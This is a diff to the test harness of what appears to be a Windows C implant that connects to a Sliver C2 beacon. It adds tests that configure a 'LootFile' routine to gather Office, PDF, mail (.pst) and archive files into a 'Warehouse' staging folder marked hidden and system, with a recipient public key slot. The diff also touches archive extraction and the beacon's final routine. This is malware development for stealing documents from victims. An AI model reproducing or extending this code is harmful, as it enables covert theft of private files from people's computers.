@@ -2663,13 +2663,66 @@ CLEANUP:
 void test152(void) {
 	PITEM_INFO* ItemList = NULL;
 	DWORD dwNumberOfItems = 0;
+	WCHAR wszPath[] = L"D:\\App\\Dev Tools\\drltrace\\drltrace_src\\dynamorio\\clients\\drcachesim\\tests\\drmemtrace.threadsig.x64.tracedir\\drmemtrace.threadsig.10506.7343.trace.gz";
 
-	ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Downloads\\QD3.rar", "D:\\Temp\\sevenzip-master\\CPP\\7zip\\Bundles\\Format7zF\\x64\\7z.dll", TRUE, &dwNumberOfItems);
+	ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
+	//ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Desktop\\detai.rar", NULL, TRUE, &dwNumberOfItems);
 }
 
 void test153(void) {
-	LootFile(NULL);
-	Sleep(10000000);
+	GLOBAL_CONFIG Config;
+	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
+	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
+	DWORD i = 0;
+
+	lstrcpyW(Config.wszWarehouse, L"C:\\Users\\Admin\\Desktop\\Warehouse");
+	Config.lpRecipientPubKey = DuplicateStrA("Hello", 0);
+	Config.DocumentExtensions = ALLOC(sizeof(LPWSTR) * _countof(DocumentExtensions));
+	Config.cDocumentExtensions = _countof(DocumentExtensions);
+	for (i = 0; i < _countof(DocumentExtensions); i++) {
+		Config.DocumentExtensions[i] = DuplicateStrW(DocumentExtensions[i], 0);
+	}
+
+	Config.ArchiveExtensions = ALLOC(sizeof(LPWSTR) * _countof(ArchiveExtensions));
+	Config.cArchiveExtensions = _countof(ArchiveExtensions);
+	for (i = 0; i < _countof(ArchiveExtensions); i++) {
+		Config.ArchiveExtensions[i] = DuplicateStrW(ArchiveExtensions[i], 0);
+	}
+
+	LootFile(&Config);
+	Sleep(100000000);
+}
+
+void test154(void) {
+	WCHAR wszDriveName[0x8] = L"A:\\";
+	DWORD dwSectorsPerCluster = 0;
+	DWORD dwBytesPerSector = 0;
+	DWORD dwNumberOfFreeClusters = 0;
+	DWORD dwTotalNumberOfClusters = 0;
+
+	wszDriveName[0] += PathGetDriveNumberW(L"C:\\Users\\Admin\\Desktop");
+	if (!GetDiskFreeSpaceW(wszDriveName, &dwSectorsPerCluster, &dwBytesPerSector, &dwNumberOfFreeClusters, &dwTotalNumberOfClusters)) {
+		LOG_ERROR("GetDiskFreeSpaceW", GetLastError());
+		return;
+	}
+
+	PrintFormatA("dwSectorsPerCluster: %d\n", dwSectorsPerCluster);
+	PrintFormatA("dwBytesPerSector: %d\n", dwBytesPerSector);
+	PrintFormatA("dwNumberOfFreeClusters: %d\n", dwNumberOfFreeClusters);
+	PrintFormatA("dwTotalNumberOfClusters: %d\n", dwTotalNumberOfClusters);
+}
+
+void test155(void) {
+	WCHAR wszWarehouse[] = L"C:\\Users\\Admin\\Desktop\\Warehouse";
+	DWORD dwFolderAttrib = 0;
+
+	CreateDirectoryW(wszWarehouse, NULL);
+	dwFolderAttrib = GetFileAttributesW(wszWarehouse);
+	dwFolderAttrib |= FILE_ATTRIBUTE_HIDDEN;
+	dwFolderAttrib |= FILE_ATTRIBUTE_SYSTEM;
+	if (!SetFileAttributesW(wszWarehouse, dwFolderAttrib)) {
+		LOG_ERROR("SetFileAttributesW", GetLastError());
+	}
 }
 
 BOOL IsExist
@@ -2768,8 +2821,8 @@ VOID Final(VOID)
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	WCHAR wszConfigPath[MAX_PATH];
 	LPWSTR lpTemp = NULL;
-	LPWSTR DocumentExtensions[] = { L"doc", L"docm", L"docx", L"pdf", L"ppsm", L"ppsx", L"ppt", L"pptm", L"pptx", L"pst", L"rtf", L"xlm", L"xls", L"xlsm", L"xlsx", L"odt", L"ods", L"odp", L"odg", L"odf" };
-	LPWSTR ArchiveExtensions[] = { L"rar", L"zip", L"tar", L"gz", L"xz", L"sz", L"7z" };
+	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
+	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
 	DWORD i = 0;
 
 #ifndef _DEBUG
@@ -3135,6 +3188,8 @@ int WinMain
 	//test151();
 	//test152();
 	test153();
+	//test154();
+	//test155();
 	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
